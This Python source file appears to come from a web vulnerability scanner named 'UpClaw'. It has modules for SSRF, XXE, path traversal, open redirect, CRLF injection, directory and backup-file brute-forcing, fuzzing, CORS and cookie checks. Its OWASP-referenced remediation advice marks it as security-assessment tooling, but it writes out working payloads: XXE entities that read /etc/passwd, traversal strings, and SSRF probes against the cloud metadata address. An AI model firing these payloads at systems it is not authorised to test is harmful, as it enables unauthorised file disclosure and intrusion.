SSRF_ECHO_SIGS = [
    "127.0.0.1", "localhost", "0.0.0.0", "169.254.169.254", "10.", "172.16.", "192.168.",
]


def _run_ssrf(store: FindingStore, url: str, cfg: dict[str, Any]) -> None:
    """SSRF 初检：向参数注入内网回环地址，检测响应内容差分。"""
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    if not params:
        return
    limiter = RateLimiter(float(cfg.get("rate_limit", 0.0)) or 0.08)
    base = _get(url, cfg, limiter)
    if not base.ok:
        return
    base_low = (base.body or "").lower()
    for key, orig in params:
        for target_url in ("http://127.0.0.1/", "http://127.0.0.1:8080/", "http://169.254.169.254/latest/meta-data/"):
            test_url = _build(url, key, target_url)
            r = _get(test_url, cfg, limiter)
            if not r.ok:
                continue
            low = (r.body or "").lower()
            hit = [s for s in SSRF_ECHO_SIGS if s in low and s not in base_low]
            # 内容显著变化也可能代表服务端发起了请求（如返回了内网默认页特征）
            if hit:
                store.add(
                    title=f"SSRF — 参数 `{key}` 可访问内网地址",
                    severity="HIGH",
                    status="VERIFIED",
                    category="ssrf",
                    target=url,
                    location=f"参数 {key}",
                    description=f"向参数 `{key}` 注入内网地址 {target_url} 后，响应出现内网/回环特征"
                                f"（{hit[0]}），服务端可能对注入地址发起了请求。",
                    evidence=_extract_snippet(r.body),
                    request=f"GET {test_url}",
                    impact="可利用服务器访问内网服务、云元数据接口（如 169.254.169.254）或读取内部资源。",
                    remediation="对 URL 类参数做协议与主机白名单校验，禁止访问内网地址与云元数据接口；"
                                "使用 SSRF 防护库或代理过滤。",
                    references=["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"],
                    cvss=8.8,
                )
                break
        else:
            continue
        break


XXE_MARKERS = ["xxe-test-", "ENTITY"]


def _run_xxe(store: FindingStore, url: str, cfg: dict[str, Any]) -> None:
    """XXE 初检：向目标发送含外部实体的 XML 载荷，检测实体内容回显。"""
    base_url = url.split("?")[0]
    limiter = RateLimiter(float(cfg.get("rate_limit", 0.0)) or 0.1)
    entity = "xxe" + "".join(random.choice(string.ascii_lowercase) for _ in range(5))
    payloads = [
        f"""<?xml version="1.0"?><!DOCTYPE root [<!ENTITY {entity} SYSTEM "file:///etc/passwd">]><root>&{entity};</root>""",
        f"""<?xml version="1.0"?><!DOCTYPE root [<!ENTITY {entity} SYSTEM "file:///c:/windows/win.ini">]><root>&{entity};</root>""",
    ]
    for payload in payloads:
        try:
            r = http_request(
                base_url,
                method="POST",
                headers={"Content-Type": "application/xml"},
                body=payload,
                timeout=float(cfg.get("timeout", 6.0)),
                follow_redirects=bool(cfg.get("follow_redirects", True)),
                verify_tls=bool(cfg.get("verify_tls", False)),
                user_agent=str(cfg.get("user_agent", "UpClaw/0.1.0")),
            )
        except Exception:
            continue
        if not r.ok:
            continue
        low = (r.body or "").lower()
        if "root:x:0:0" in low or "[fonts]" in low or "for 16-bit" in low:
            store.add(
                title="XXE — 外部实体注入成功",
                severity="HIGH",
                status="VERIFIED",
                category="xxe",
                target=url,
                location=base_url,
                description="向目标提交含外部实体（file://）的 XML 载荷后，响应中回显了本地文件内容，"
                            "说明 XML 解析器未禁用外部实体。",
                evidence=_extract_snippet(r.body),
                request=f"POST {base_url}\nContent-Type: application/xml\n\n{payload[:200]}",
                impact="可读取服务器本地文件（含配置与密钥）、发起内网请求，甚至 RCE。",
                remediation="禁用 XML 解析器的外部实体（XXE）与 DTD 处理；使用安全解析库（如 defusedxml）。",
                references=["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"],
                cvss=8.3,
            )
            return
    # 若解析器报实体引用错误，说明接受了 XML 输入但禁用了外部实体——记录为低风险信息
    for payload in payloads:
        try:
            r = http_request(
                base_url,
                method="POST",
                headers={"Content-Type": "application/xml"},
                body=payload,
                timeout=float(cfg.get("timeout", 6.0)),
                follow_redirects=bool(cfg.get("follow_redirects", True)),
                verify_tls=bool(cfg.get("verify_tls", False)),
                user_agent=str(cfg.get("user_agent", "UpClaw/0.1.0")),
            )
        except Exception:
            continue
        if r.ok and ("&" + entity + ";" in (r.body or "")) and ("DOCTYPE" not in (r.body or "")):
            store.add(
                title="目标接受 XML 输入（XXE 防御待确认）",
                severity="INFO",
                status="UNVERIFIED",
                category="xxe",
                target=url,
                location=base_url,
                description="目标接受 XML 请求体，外部实体未回显（可能已禁用），建议人工复核解析器配置。",
                evidence="XML 输入被接受但未回显实体内容",
                request=f"POST {base_url}",
                impact="如实体被禁用则风险有限；需人工确认解析器安全配置。",
                remediation="确保 XML 解析器禁用 DTD/外部实体。",
                references=["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"],
                cvss=0.0,
            )
            return


LFI_MARKERS = ["root:x:0:0", "daemon:x:1:1", "[fonts]", "boot loader", "for 16-bit"]
LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2fetc/passwd",
    "..%2f..%2f..%2fwindows/win.ini",
    "..\\..\\..\\..\\windows\\win.ini",
    "/etc/passwd",
]


def _run_lfi(store: FindingStore, url: str, cfg: dict[str, Any]) -> None:
    """本地文件包含（LFI）初检：路径遍历载荷 + 文件内容特征。"""
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    if not params:
        return
    limiter = RateLimiter(float(cfg.get("rate_limit", 0.0)) or 0.08)
    base = _get(url, cfg, limiter)
    if not base.ok:
        return
    base_low = (base.body or "").lower()
    for key, orig in params:
        for payload in LFI_PAYLOADS:
            test_url = _build(url, key, payload)
            r = _get(test_url, cfg, limiter)
            if not r.ok:
                continue
            low = (r.body or "").lower()
            hit = [m for m in LFI_MARKERS if m in low and m not in base_low]
            if hit:
                store.add(
                    title=f"本地文件包含（LFI）— 参数 `{key}`",
                    severity="HIGH",
                    status="VERIFIED",
                    category="lfi",
                    target=url,
                    location=f"参数 {key}",
                    description=f"向参数 `{key}` 注入路径遍历载荷后，响应中出现本地文件内容特征"
                                f"（{hit[0]}），可读取服务器文件。",
                    evidence=_extract_snippet(r.body),
                    request=f"GET {test_url}",
                    impact="可读取服务器本地敏感文件（/etc/passwd、配置文件、源码），"
                           "结合日志注入可升级为 RCE。",
                    remediation="对文件包含参数做白名单校验，禁止路径穿越字符（../），"
                                "使用固定目录 + 哈希命名。",
                    references=["https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_File_Inclusion"],
                    cvss=8.1,
                )
                break
        else:
            continue
        break


REDIRECT_PARAMS = ["next", "url", "redirect", "return", "return_url", "dest", "redir", "target", "rurl", "continue"]
REDIRECT_EXTERNAL = "https://example.com/"
REDIRECT_EXTERNAL_HOST = "example.com"


def _run_open_redirect(store: FindingStore, url: str, cfg: dict[str, Any]) -> None:
    """开放重定向初检：注入外部链接，检测 Location 头反射。"""
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    if not params:
        return
    limiter = RateLimiter(float(cfg.get("rate_limit", 0.0)) or 0.08)
    for key, orig in params:
        if key.lower() not in REDIRECT_PARAMS:
            continue
        test_url = _build(url, key, REDIRECT_EXTERNAL)
        r = http_request(
            test_url,
            timeout=float(cfg.get("timeout", 6.0)),
            follow_redirects=False,
            verify_tls=bool(cfg.get("verify_tls", False)),
            user_agent=str(cfg.get("user_agent", "UpClaw/0.1.0")),
        )
        loc = r.header("Location") or ""
        if r.status in (301, 302, 303, 307, 308) and REDIRECT_EXTERNAL_HOST in loc:
            store.add(
                title=f"开放重定向 — 参数 `{key}`",
                severity="MEDIUM",
                status="VERIFIED",
                category="open-redirect",
                target=url,
                location=f"参数 {key}",
                description=f"参数 `{key}` 接受外部 URL 并 30x 跳转到 {loc}，可用于钓鱼攻击。",
                evidence=f"HTTP {r.status}\nLocation: {loc}",
                request=f"GET {test_url}",
                impact="攻击者可构造看似可信的链接将用户重定向到钓鱼站点，窃取凭据。",
                remediation="对跳转 URL 做白名单域名校验，仅允许站内相对路径跳转。",
                references=["https://owasp.org/www-community/attacks/URL_Redirector_Abuse"],
                cvss=4.7,
            )
            break


CRLF_HEADER = "X-UpClaw-Injected"


def _run_crlf(store: FindingStore, url: str, cfg: dict[str, Any]) -> None:
    """CRLF 注入初检：向参数注入 %0d%0a，检测响应头拆分。"""
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    if not params:
        return
    limiter = RateLimiter(float(cfg.get("rate_limit", 0.0)) or 0.08)
    for key, orig in params:
        payload = f"%0d%0a{CRLF_HEADER}: 1"
        test_url = _build(url, key, orig + payload)
        try:
            r = http_request(
                test_url,
                timeout=float(cfg.get("timeout", 6.0)),
                follow_redirects=False,
                verify_tls=bool(cfg.get("verify_tls", False)),
                user_agent=str(cfg.get("user_agent", "UpClaw/0.1.0")),
            )
        except Exception:
            continue
        if not r.ok:
            continue
        if any(k.lower() == CRLF_HEADER.lower() for k in r.headers):
            store.add(
                title=f"CRLF 注入 — 参数 `{key}`",
                severity="MEDIUM",
                status="VERIFIED",
                category="crlf",
                target=url,
                location=f"参数 {key}",
                description=f"参数 `{key}` 中注入 %0d%0a 后成功拆分响应头并注入 {CRLF_HEADER} 头，"
                            "存在响应拆分/会话固定风险。",
                evidence=f"检测到注入响应头: {CRLF_HEADER}: 1",
                request=f"GET {test_url}",
                impact="可注入任意响应头，进行会话固定、XSS（配合刷新头）或绕过安全机制。",
                remediation="对用户输入做严格过滤，拒绝 CR/LF（%0d/%0a）字符；输出时编码。",
                references=["https://owasp.org/www-community/attacks/HTTP_Response_Splitting"],
                cvss=5.3,
            )
            break


"""v0.2.0 暴力破解类：目录爆破 / 备份文件扫描 / 参数模糊测试。"""

# 目录爆破字典（覆盖管理、技术栈、API、文件、环境类路径）
DIR_WORDS = [
    "admin", "administrator", "login", "signin", "auth", "oauth", "sso", "register",
    "account", "user", "users", "profile", "dashboard", "panel", "console", "manage",
    "backup", "bak", "temp", "tmp", "test", "tests", "demo", "dev", "staging", "old",
    "www", "web", "public", "private", "internal", "api", "v1", "v2", "v3", "graphql",
    "rest", "swagger", "swagger-ui", "swagger-ui.html", "api-docs", "docs", "documentation",
    "doc", "help", "guide", "manual", "readme", "about", "contact", "faq", "status",
    "health", "healthz", "metrics", "monitor", "debug", "trace", "log", "logs", "error",
    "uploads", "upload", "download", "downloads", "files", "file", "images", "img", "assets",
    "static", "css", "js", "scripts", "media", "data", "db", "database", "sql", "dump",
    "config", "conf", "settings", "setup", "install", "phpinfo", "info", "server-status",
    "server-info", "wp-admin", "wp-content", "wp-includes", "administrator", "manager",
    "actuator", "actuator/env", "console", "jenkins", "git", ".git", ".svn", ".hg",
    "phpmyadmin", "adminer", "webmail", "mail", "cgi-bin", "icons", "pma", "dbadmin",
    "robots.txt", "sitemap.xml", "crossdomain.xml", ".env", ".well-known", "weblogic",
    "tomcat", "manager/html", "host-manager", "drupal", "joomla", "laravel", "django",
]
BACKUP_SUFFIXES = [".bak", ".zip", ".tar", ".tar.gz", ".gz", ".sql", ".old", ".orig", ".save", ".swp", "~", ".txt", ".conf", ".config", ".log", ".yml", ".yaml", ".json", ".ini", ".php~"]


def _run_dir(store: FindingStore, url: str, cfg: dict[str, Any]) -> None:
    """目录爆破：内置字典并发探测，状态码分级。"""
    base_url = url.split("?")[0].rstrip("/")
    limiter = RateLimiter(float(cfg.get("rate_limit", 0.0)) or 0.03)
    threads = max(1, min(int(cfg.get("threads", 16)), 32))
    base = _get(base_url, cfg, limiter)
    base_status = base.status if base.ok else 0

    def probe(path: str) -> dict[str, Any] | None:
        limiter.wait()
        r = _get(f"{base_url}/{path}", cfg, limiter)
        if not r.ok:
            return None
        if r.status == base_status:
            return None  # 与基线相同，大概率是统一 404 页面
        if r.status in (200, 301, 302, 307, 308, 401, 403, 500):
            return {"path": path, "status": r.status, "loc": r.header("Location") or "", "len": len(r.body or "")}
        return None

    found: list[dict[str, Any]] = []
    with ThreadPoolExecutor(max_workers=threads) as ex:
        for res in ex.map(probe, DIR_WORDS):
            if res:
                found.append(res)
    if not found:
        return
    lines = "\n".join(f"  {f['status']}  /{f['path']}" + (f"  → {f['loc']}" if f["loc"] else "") for f in found[:30])
    risky = [f for f in found if f["path"].startswith((".git", ".svn", ".env", "admin", "phpmyadmin", "actuator"))]
    store.add(
        title=f"目录爆破：发现 {len(found)} 个可访问路径",
        severity="HIGH" if risky else "MEDIUM",
        status="VERIFIED",
        category="dir",
        target=url,
        location=base_url,
        description="通过字典爆破发现以下可访问路径（状态码与基线不同）：",
        evidence=lines,
        request=f"GET {base_url}/<word> (共探测 {len(DIR_WORDS)} 个路径)",
        impact="暴露管理后台、源码目录（.git/.svn）、配置或敏感端点，扩大攻击面。",
        remediation="移除或保护敏感路径；对不存在的路径返回统一 404；"
                    "限制管理入口访问（IP 白名单/二次认证）。",
        references=["https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Webpage_Content_for_Information_Leakage"],
        cvss=5.3 if not risky else 7.5,
    )


def _run_backup(store: FindingStore, url: str, cfg: dict[str, Any]) -> None:
    """备份文件扫描：对常见文件探测备份/泄漏后缀。"""
    base_url = url.split("?")[0].rstrip("/")
    limiter = RateLimiter(float(cfg.get("rate_limit", 0.0)) or 0.03)
    threads = max(1, min(int(cfg.get("threads", 16)), 32))
    base = _get(base_url, cfg, limiter)
    base_status = base.status if base.ok else 0
    # 探测基础文件名的各种备份变体
    candidates = ["config.php", "index.php", "db", "database", "backup", "config", "settings", "wp-config.php", "admin", "site", "app", "data", "main", ".env"]
    targets: list[str] = []
    for c in candidates:
        for sfx in BACKUP_SUFFIXES:
            targets.append(f"{c}{sfx}")
    # 过滤掉与字典重复的纯文件（避免与 dir 重复）；此处专注备份后缀
    targets = [t for t in targets if t != "backup"]

    def probe(t: str) -> dict[str, Any] | None:
        limiter.wait()
        r = _get(f"{base_url}/{t}", cfg, limiter)
        if not r.ok:
            return None
        if r.status == base_status:
            return None
        if r.status == 200:
            return {"t": t, "status": r.status, "len": len(r.body or "")}
        return None

    found: list[dict[str, Any]] = []
    with ThreadPoolExecutor(max_workers=threads) as ex:
        for res in ex.map(probe, targets):
            if res:
                found.append(res)
    if not found:
        return
    store.add(
        title=f"发现 {len(found)} 个备份/泄漏文件",
        severity="HIGH",
        status="VERIFIED",
        category="backup",
        target=url,
        location=base_url,
        description="以下备份或源码文件可被公开访问，可能包含源码、配置或敏感数据：",
        evidence="\n".join(f"  {f['status']}  /{f['t']} ({f['len']}B)" for f in found[:30]),
        request=f"GET {base_url}/<file><backup-suffix>",
        impact="备份文件常包含完整源码、数据库凭据、API 密钥，可导致严重信息泄露。",
        remediation="禁止将备份文件放置在 Web 根目录；配置服务器拒绝访问 .bak/.sql 等后缀；"
                    "定期清理服务器上的备份文件。",
        references=["https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Webpage_Content_for_Information_Leakage"],
        cvss=7.5,
    )


FUZZ_PARAMS = [
    "debug", "test", "admin", "user", "id", "page", "lang", "redirect", "return", "next",
    "url", "file", "path", "dir", "folder", "view", "action", "mod", "do", "op", "type",
    "format", "callback", "email", "name", "q", "search", "s", "cmd", "exec", "command",
    "download", "token", "key", "api_key", "apikey", "secret", "password", "pass", "config",
    "source", "src", "include", "require", "template", "theme", "cache", "cat", "f",
]


def _run_fuzz(store: FindingStore, url: str, cfg: dict[str, Any]) -> None:
    """参数模糊测试：注入常见参数名，检测响应异常（错误/调试信息泄露）。"""
    base_url = url.split("?")[0]
    limiter = RateLimiter(float(cfg.get("rate_limit", 0.0)) or 0.04)
    threads = max(1, min(int(cfg.get("threads", 16)), 32))
    base = _get(url, cfg, limiter)
    base_len = len(base.body or "") if base.ok else 0
    base_status = base.status if base.ok else 0
    # 注入值：唯一标记，检测回显（反射/日志注入）
    marker = "fz" + "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(6))
    interesting = ["debug", "test", "admin", "config", "source", "src", "cmd", "exec", "template", "callback", "download", "trace", "verbose"]

    def probe(name: str) -> dict[str, Any] | None:
        limiter.wait()
        test_url = f"{base_url}?{urllib.parse.urlencode({name: marker})}"
        r = _get(test_url, cfg, limiter)
        if not r.ok:
            return None
        if r.status in (500, 501) or len(r.body or "") > base_len + 2000:
            return {"name": name, "status": r.status, "delta": len(r.body or "") - base_len}
        if marker in (r.body or ""):
            return {"name": name, "status": r.status, "reflected": True}
        return None

    hits: list[dict[str, Any]] = []
    with ThreadPoolExecutor(max_workers=threads) as ex:
        for res in ex.map(probe, FUZZ_PARAMS):
            if res:
                hits.append(res)
    if not hits:
        return
    reflected = [h for h in hits if h.get("reflected")]
    error_hits = [h for h in hits if not h.get("reflected")]
    lines = "\n".join(
        f"  {h['name']}: status={h['status']}" + (f" delta={h['delta']}B" if "delta" in h else " [参数值回显]")
        for h in hits[:30]
    )
    store.add(
        title=f"参数模糊：发现 {len(hits)} 个异常参数行为",
        severity="LOW",
        status="UNVERIFIED" if not reflected else "VERIFIED",
        category="fuzz",
        target=url,
        location=base_url,
        description="注入常见参数名后观察到异常响应（错误/调试信息/输入回显）：",
        evidence=lines,
        request=f"GET {base_url}?<param>=<marker>",
        impact="可能暴露调试信息、源码路径或可反射参数（放大其他漏洞）；需人工复核。",
        remediation="生产环境关闭错误回显与调试模式；对所有参数做输入校验与输出编码。",
        references=["https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting"],
        cvss=2.6 if not reflected else 3.7,
    )


def _request_raw(
    url: str,
    cfg: dict[str, Any],
    method: str = "GET",
    headers: dict[str, str] | None = None,
) -> tuple[int, list[tuple[str, str]], str, str]:
    """原始 HTTP 请求：保留全部响应头（含重复 Set-Cookie）。

    返回 (status, headers 列表, body, error)。与 http_request 不同，
    不做重定向跟随，供 cookie / cors / methods / webdav 等需逐响应头分析的模块使用。
    """
    hdrs = {"User-Agent": str(cfg.get("user_agent", "UpClaw/0.1.0")), "Accept": "*/*"}
    if headers:
        hdrs.update(headers)
    try:
        p = urllib.parse.urlparse(url)
        scheme = p.scheme or "https"
        host = p.hostname or ""
        port = p.port or (443 if scheme == "https" else 80)
        path = p.path or "/"
        if p.query:
            path += "?" + p.query
        ctx = None
        if scheme == "https":
            ctx = ssl.create_default_context()
            if not bool(cfg.get("verify_tls", False)):
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
        conn = (
            http.client.HTTPSConnection(host, port, timeout=float(cfg.get("timeout", 6.0)), context=ctx)
            if scheme == "https"
            else http.client.HTTPConnection(host, port, timeout=float(cfg.get("timeout", 6.0)))
        )
        try:
            conn.request(method, path, headers=hdrs)
            resp = conn.getresponse()
            raw = resp.read()
            text = raw.decode("utf-8", errors="replace")
            return resp.status, resp.getheaders(), text, ""
        finally:
            conn.close()
    except socket.timeout:
        return 0, [], "", f"请求超时 ({cfg.get('timeout', 6.0)}s)"
    except ssl.SSLError as e:
        return 0, [], "", f"TLS 错误: {e}"
    except (http.client.HTTPException, OSError) as e:
        return 0, [], "", f"连接失败: {e}"


def _has_cookie_flag(cookie_raw: str, flag: str) -> bool:
    """判断某条 Set-Cookie 原始值是否包含指定属性（Secure/HttpOnly/SameSite...）。"""
    for part in cookie_raw.split(";"):
        name = part.strip().split("=", 1)[0].strip().lower()
        if name == flag.lower():
            return True
    return False


def _run_cors(store: FindingStore, url: str, cfg: dict[str, Any]) -> None:
    """CORS 检测：Origin 反射 + Access-Control-Allow-Credentials 组合判定。"""
    limiter = RateLimiter(float(cfg.get("rate_limit", 0.0)) or 0.05)
    limiter.wait()
    status, _, _, err = _request_raw(url, cfg, "GET")
    if err or not status:
        return
    origin = "https://upclaw-check.example"
    limiter.wait()
    s2, hdrs, _, err2 = _request_raw(url, cfg, "GET", headers={"Origin": origin})
    if err2 or not s2:
        return
    low = {k.lower(): v for k, v in hdrs}
    acao = (low.get("access-control-allow-origin", "") or "").strip()
    acac = (low.get("access-control-allow-credentials", "") or "").strip()
    if not acao:
        return  # 无 CORS 头，无需关注
    acac_true = acac.lower() == "true"
    if acao == "*":
        title_note = "通配符 ACAO" + (" + 允许凭据（错误配置）" if acac_true else "（任意源可读）")
        severity, cvss, status_ = ("HIGH", 7.5, "VERIFIED") if acac_true else ("LOW", 5.3, "VERIFIED")
        impact = (
            "`Access-Control-Allow-Origin: *` 配合 `Access-Control-Allow-Credentials: true` 属错误配置，"
            "浏览器虽禁止携带凭据的通配符响应，但结合其他配置可被滥用。"
            if acac_true
            else "任意源均可跨域读取该接口响应，可能泄露非敏感业务数据。"
        )
    elif origin in acao:
        title_note = "Origin 反射" + (" + 允许凭据" if acac_true else "（无凭据）")
        severity, cvss, status_ = ("HIGH", 8.1, "VERIFIED") if acac_true else ("MEDIUM", 6.1, "VERIFIED")
        impact = (
            "恶意网站可构造任意 Origin 触发反射，配合允许凭据可携带用户 Cookie 跨域读取敏感数据。"
            if acac_true
            else "任意源可将 Origin 反射进 ACAO，跨域读取响应（不携带凭据，危害取决于接口敏感度）。"
        )
    else:
        return  # 固定白名单，配置正常
    store.add(
        title=f"CORS 配置：{title_note}",
        severity=severity,
        status=status_,
        category="cors",
        target=url,
        location=url,
        description=f"携带 `Origin: {origin}` 的请求响应返回了 "
                    f"`Access-Control-Allow-Origin: {acao}`" +
                    ("，且允许携带凭据（`Access-Control-Allow-Credentials: true`）。"
                     if acac_true else "，未允许携带凭据。"),
        evidence=f"响应头:\n  Access-Control-Allow-Origin: {acao}\n"
                 f"  Access-Control-Allow-Credentials: {acac or '(未设置)'}",
        request=f"GET {url}\nOrigin: {origin}",
        impact=impact,
        remediation="仅在可信来源白名单中反射 Origin；生产环境禁止使用 `*` 通配符；"
                    "敏感接口不得同时使用凭据模式与宽泛反射。",
        references=["https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny"],
        cvss=cvss,
    )


def _run_cookie(store: FindingStore, url: str, cfg: dict[str, Any]) -> None:
    """Cookie 安全属性逐项检查：Secure / HttpOnly / SameSite。"""
    limiter = RateLimiter(float(cfg.get("rate_limit", 0.0)) or 0.05)
    limiter.wait()
    status, hdrs, _, err = _request_raw(url, cfg, "GET")
    if err or not status:
        return
    cookies: list[tuple[str, str]] = []  # (原始 Set-Cookie, cookie 名)
    for k, v in hdrs:
        if k.lower() == "set-cookie":
            name = v.split(";", 1)[0].split("=", 1)[0].strip()
            cookies.append((v, name))
    if not cookies:
        return
    names = {n for _, n in cookies}
    checks = [
        ("HttpOnly", "MEDIUM", 5.4,
         "未标记 HttpOnly，客户端 JavaScript 可通过 document.cookie 读取会话凭据，XSS 时被直接窃取。",
         "https://owasp.org/www-community/HttpOnly"),
        ("Secure", "MEDIUM", 5.9,
         "未标记 Secure，可能经明文 HTTP 传输被中间人窃听。",
         "https://owasp.org/www-project-secure-headers/"),
        ("SameSite", "LOW", 4.3,
         "未设置 SameSite 属性，跨站请求（CSRF）中 Cookie 的携带策略由浏览器决定，风险取决于浏览器默认行为。",
         "https://owasp.org/www-community/SameSite"),
    ]
    for attr, sev, cvss, desc, ref in checks:
        missing = sorted(n for raw, n in cookies if not _has_cookie_flag(raw, attr))
        if not missing:
            continue
        store.add(
            title=f"Cookie 缺少 `{attr}` 属性",
            severity=sev,
            status="VERIFIED",
            category="cookie",
            target=url,
            location=url,
            description=f"响应设置 {len(missing)} 个 Cookie 未标记 `{attr}`：{', '.join(missing)}。{desc}",
            evidence=f"受影响 Cookie: {', '.join(missing)}\n"
                     f"Set-Cookie 示例: {next(v for v, _ in cookies if not _has_cookie_flag(v, attr))[:120]}",
            request=f"GET {url}",
            impact="会话凭据可能被 XSS 窃取 / 明文传输泄露 / 被 CSRF 利用（取决于缺失属性）。",
            remediation=f"为所有会话 Cookie 添加 `{attr}` 属性；涉及跨站时按需配置 `SameSite=Lax|Strict|None`。",
            references=[ref],
            cvss=cvss,
        )


def _run_methods(store: FindingStore, url: str, cfg: dict[str, Any]) -> None:
    """HTTP 方法探测：OPTIONS 列出允许方法，识别 TRACE/PUT/DELETE 等危险方法。"""
    limiter = RateLimiter(float(cfg.get("rate_limit", 0.0)) or 0.05)
    limiter.wait()
    status, hdrs, _, err = _request_raw(url, cfg, "OPTIONS")
    if err or not status:
        return
    low = {k.lower(): v for k, v in hdrs}
    allow = ((low.get("allow", "") or "") + "," + (low.get("public", "") or "")).upper()
    if not allow.strip():
        return
    methods = {m.strip() for m in allow.split(",") if m.strip()}
    danger: list[tuple[str, str, float, str]] = []
    if "TRACE" in methods:
        danger.append(("TRACE", "MEDIUM", 5.3,
                       "跨站追踪（XST）风险：可结合 XSS 窃取 HttpOnly Cookie 或绕过防护。"))
    if "PUT" in methods:
        danger.append(("PUT", "MEDIUM", 6.5,
                       "允许上传/覆盖资源，若未鉴权与文件类型校验可被植入恶意文件。"))
    if "DELETE" in methods:
        danger.append(("DELETE", "MEDIUM", 5.3,
                       "允许删除资源，若未鉴权可造成数据破坏。"))
    if "PATCH" in methods:
        danger.append(("PATCH", "LOW", 3.7,
                       "允许部分修改资源，需确认鉴权与输入校验到位。"))
    if "CONNECT" in methods:
        danger.append(("CONNECT", "MEDIUM", 5.0,
                       "可能被用作代理隧道，绕过访问控制。"))
    if not danger:
        return
    lines = "\n".join(f"  {m}: {d}" for m, _, _, d in danger)
    store.add(
        title=f"启用了 {len(danger)} 个危险 HTTP 方法",
        severity="MEDIUM",
        status="VERIFIED",
        category="methods",
        target=url,
        location=url,
        description=f"OPTIONS 响应允许以下危险方法（Allow: {', '.join(sorted(methods))}）：",
        evidence=lines,
        request=f"OPTIONS {url}",
        impact="危险方法一旦缺乏鉴权/校验，可被用于文件写入、数据删除、代理滥用等攻击。",
        remediation="在 Web 服务器/框架层禁用不需要的方法（尤其 TRACE/PUT/DELETE/CONNECT）；"
                    "确需使用时必须做鉴权与输入校验。",
        references=["https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods"],
        cvss=5.3,
    )


def _run_webdav(store: FindingStore, url: str, cfg: dict[str, Any]) -> None:
    """WebDAV 检测：OPTIONS 响应中 DAV / MS-Author-Via / Allow 提示 WebDAV 方法启用。"""
    limiter = RateLimiter(float(cfg.get("rate_limit", 0.0)) or 0.05)
    limiter.wait()
    status, hdrs, _, err = _request_raw(url, cfg, "OPTIONS")
    if err or not status:
        return
    low = {k.lower(): v for k, v in hdrs}
    allow = (low.get("allow", "") or "").upper()
    dav = (low.get("dav", "") or "").strip()
    msv = (low.get("ms-author-via", "") or "").strip()
    methods = {m.strip() for m in allow.split(",") if m.strip()}
    dav_methods = {"PROPFIND", "PROPPATCH", "MKCOL", "COPY", "MOVE", "LOCK", "UNLOCK"}
    enabled = [m for m in dav_methods if m in methods]
    if dav:
        enabled.append(f"DAV:{dav}")
    if msv:
        enabled.append(f"MS-Author-Via:{msv}")
    if not enabled:
        return
    dangerous = [m for m in enabled if m in ("MOVE", "COPY", "MKCOL") or m.startswith("DAV:")]
    severity, cvss = ("HIGH", 7.5) if dangerous else ("MEDIUM", 5.3)
    store.add(
        title="启用了 WebDAV 扩展",
        severity=severity,
        status="VERIFIED",
        category="webdav",
        target=url,
        location=url,
        description="OPTIONS 响应表明服务器启用了 WebDAV 相关方法/扩展：",
        evidence="\n".join(f"  {m}" for m in enabled),
        request=f"OPTIONS {url}",
        impact=("WebDAV 允许远程创建/移动/覆盖文件（如 PUT/MOVE），未正确鉴权时可被用于"
                "上传 Webshell 或篡改站点内容。"
                if dangerous
                else "WebDAV 方法暴露了目录/资源元数据，可能泄露文件列表等敏感信息。"),
        remediation="如无必要，在服务器配置中禁用 WebDAV 模块；确需使用时限制方法、目录并强制鉴权。",
        references=["https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/05-Test_HTTP_Methods"],
        cvss=cvss,
    )


# === UPCLAW-V0.2-MODULES ===


# 检测模块注册表（各模块的 run 函数分别以 _run_xxx 定义）
AVAILABLE = {
    # 信息收集
    "dns": _run_dns,
    "subdomain": _run_subdomain,
    "waf": _run_waf,
    "tls": _run_tls,
    # 漏洞验证
    "cmdi": _run_cmdi,
    "ssrf": _run_ssrf,
    "xxe": _run_xxe,
    "lfi": _run_lfi,
    "open-redirect": _run_open_redirect,
    "crlf": _run_crlf,
    # 暴力破解
    "dir": _run_dir,
    "backup": _run_backup,
    "fuzz": _run_fuzz,
    # Web 安全
    "cors": _run_cors,
    "cookie": _run_cookie,
    "methods": _run_methods,
    "webdav": _run_webdav,
    # 基础
    "headers": _run_headers,
    "sensitive": _run_sensitive,
    "sqli": _run_sqli,
    "xss": _run_xss,
}

# 默认启用的全部检测模块（cmd_scan 默认值；外部工具不在此列，
# 由扫描的外部工具阶段自动检测并启用）
DEFAULT_CHECKS = ",".join(AVAILABLE)


# === UPCLAW-V0.3-EXT-TOOLS ===
# 外部工具适配层：自动检测本机已安装的安全工具，把它们的扫描结果
# 归一化为 UpClaw Finding（证据优先、拒绝幻觉），统一进入报告。
# - 未安装的工具自动跳过，不影响零依赖 / 无 GUI 场景；
# - 各外部工具按其自身许可独立分发，UpClaw 仅做驱动与结果归一化；
# - GUI/API 类工具（Burp/AppScan/Yakit/ARL/BeEF 等）多数无 CLI 入口，
#   只做检测并提示，由 tools / doctor 展示。


import subprocess
import tempfile
import xml.etree.ElementTree as ET


# ---- 通用辅助 ----

_SEV_MAP = {
    "critical": "CRITICAL",
    "high": "HIGH",
